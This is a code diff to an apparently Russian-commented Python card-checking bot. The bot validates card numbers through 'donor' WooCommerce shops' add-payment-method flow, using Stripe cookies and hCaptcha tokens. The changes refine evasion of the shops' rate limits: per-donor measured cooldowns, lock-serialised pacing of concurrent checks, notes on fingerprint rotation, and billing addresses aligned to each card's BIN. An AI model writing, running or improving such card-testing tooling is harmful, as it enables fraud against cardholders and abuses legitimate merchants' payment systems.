@@ -24,7 +24,9 @@ sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")
 FALLBACK_DONOR = "https://www.blackbeltprotein.com.au"
 
 # D-35: пробовал ротировать отпечаток перед открытием сессии — ОТКАЧЕНО.
-# Замер 2026-08-31: контрольный донор blackbeltprotein.com.au давал
+# Замер: 2026-08-31, объём — один контрольный донор; перепроверять раз в 30 дней
+# (последняя проверка 2026-09-12: вывод не изменился).
+# Тогда: донор blackbeltprotein.com.au давал
 # DECLINED за 5030 мс на одном отпечатке и уходил в таймаут на 75 с, когда
 # перед сессией шёл пробник на 4 отпечатка. Пять запросов вместо одного —
 # донор начинает душить, и ротация превращается в самонаведённый рейт-лимит.
@@ -246,6 +248,19 @@ class GateSession:
         self.hcaptcha_token: str | None = None
         self.stripe_cookies: dict = {"mid": "", "sid": ""}
         self.last_check_ts: float = 0.0
+        # Кулдаун add_payment_method у ЭТОГО донора, если он был измерен
+        # (в записи ready_gates.json поле rate_limit_delay_s). None = платформенный дефолт 20 с.
+        self.measured_cooldown_s: float | None = None
+        try:
+            _raw = gate_info.get("rate_limit_delay_s") if isinstance(gate_info, dict) else None
+            if _raw:
+                self.measured_cooldown_s = float(_raw)
+        except Exception:
+            self.measured_cooldown_s = None
+        # Пауза обязана СЕРИАЛИЗОВАТЬ доступ к аккаунту донора: пять конкурентных задач
+        # читали один last_check_ts и били залпом, то есть в боте пейсинг не работал вовсе
+        # (аудит 2026-09, G-31).
+        self._pace_lock = asyncio.Lock()
 
     async def open(self) -> tuple[bool, str]:
         base = self.u["base"]
@@ -376,15 +391,17 @@ class GateSession:
             return None
 
     async def check_card(self, card_raw: str, bin_alpha2: str = "US") -> dict:
-        # Автоматическая защита от кулдауна WooCommerce add-payment-method (8.1 - 9.0с)
-        if self.last_check_ts > 0:
-            elapsed = time.time() - self.last_check_ts
-            if elapsed < config.SETUP_COOLDOWN_MIN:
-                target_delay = config.setup_cooldown_delay()
+        # Пауза берётся от фактического кулдауна донора (по умолчанию платформенные 20 с,
+        # а не калиброванные 8.1-9.0 с), и она под локом: иначе конкурентные чеки на одной
+        # сессии засыпали синхронно и били залпом (аудит 2026-09, G-01 / G-31).
+        async with self._pace_lock:
+            if self.last_check_ts > 0:
+                elapsed = time.time() - self.last_check_ts
+                target_delay = config.setup_cooldown_delay(self.measured_cooldown_s)
                 wait_sec = max(0.0, target_delay - elapsed)
                 if wait_sec > 0:
                     await asyncio.sleep(wait_sec)
-        self.last_check_ts = time.time()
+            self.last_check_ts = time.time()
 
         card = gc.parse_card(card_raw)
         # Гео-выравнивание billing по BIN карты (Sprint 1.3): адрес держателя
@@ -611,8 +628,9 @@ async def main():
             results.append(res)
             status_style = res['status']
             print(f">>> [{status_style:16}] {res['card']} -> {res['detail']}", flush=True)
-            if i < len(cards) - 1:
-                await asyncio.sleep(config.setup_cooldown_delay())
+            # Паузу между картами держит сам GateSession.check_card (по фактическому кулдауну
+            # донора, под локом). Дополнительный sleep здесь удваивал интервал: 20.5 с + 20.5 с.
+            _ = i
     finally:
         for gs in sessions_cache.values():
             await gs.close()
